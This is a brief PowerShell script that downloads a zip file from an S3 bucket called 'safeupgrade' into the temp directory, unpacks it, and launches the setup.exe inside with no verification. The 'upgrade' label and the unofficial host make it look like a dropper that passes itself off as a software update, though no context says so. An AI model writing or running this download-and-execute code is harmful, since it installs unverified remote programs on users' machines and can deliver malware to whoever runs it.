$url = "https://safeupgrade.s3.us-east-2.amazonaws.com/windows64.zip"
$outputPath = [System.IO.Path]::GetTempPath()

Invoke-WebRequest -Uri $url -OutFile "$outputPath\windows64.zip"

Expand-Archive -Path "$outputPath\windows64.zip" -DestinationPath "$outputPath\safeupgrade"


Start-Process -FilePath "$outputPath\safeupgrade\setup.exe"